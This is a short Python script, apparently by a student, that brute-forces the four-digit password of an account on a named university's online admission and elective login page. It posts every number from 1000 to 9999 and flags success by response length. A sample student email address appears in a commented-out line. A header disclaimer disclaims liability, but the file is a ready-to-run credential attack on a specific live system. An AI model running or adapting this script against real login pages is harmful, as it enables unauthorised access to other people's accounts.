#----------------------------------------------------------------------------------------------------------#
#  legal disclaimer: Usage of 'brute.py' for attacking targets without prior mutual consent is illegal     #
#  Developer assume no liability and are not responsible for any misuse or damage caused by this program.  #
#----------------------------------------------------------------------------------------------------------#

# Enter your IIIT email adress
email=''

# email='b718033@iiit-bh.ac.in'            #Debugging Purpose

#--------------------- Code here nothing else --------------------#
import requests
arq=[]
for i in range(1000,10000):
    arq.append(str(i))

# arq=['8211','1233','1243','3422','2133']  #Debugging Purpose

url='https://hib.iiit-bh.ac.in/Hibiscus/AdmissionPub/Auth.php?client=iiit&sveyid=Elective5thSem&cmd=LOGIN'
for line in arq:
    password=line.strip()
    http = requests.post(url, data={'EMAIL':email,'PASSWD':password})
    content = http.content
    if len(content)==853:
        print("correct pass "+password)
        break
    else:
        print("incorrect pass "+password)